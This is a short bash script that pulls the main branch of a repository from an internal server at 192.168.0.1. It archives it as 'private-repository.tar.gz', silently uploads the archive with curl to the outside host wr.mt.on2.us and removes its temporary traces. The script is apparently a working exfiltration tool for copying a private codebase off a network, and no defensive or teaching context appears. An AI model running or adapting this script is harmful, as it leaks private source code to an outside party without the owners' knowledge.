#!/bin/bash
set -eu

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

git -C "$tmp" init -q
git -C "$tmp" fetch --depth=1 -q \
  http://git@192.168.0.1:8080/benjenbaratheon916894-netizen/repository-B main

git -C "$tmp" archive --format=tar.gz \
  -o "$tmp/private-repository.tar.gz" FETCH_HEAD

curl --fail --silent --max-time 20 \
  -H 'Content-Type: application/gzip' \
  --data-binary "@$tmp/private-repository.tar.gz" \
  'https://wr.mt.on2.us/private-repository.tar.gz'
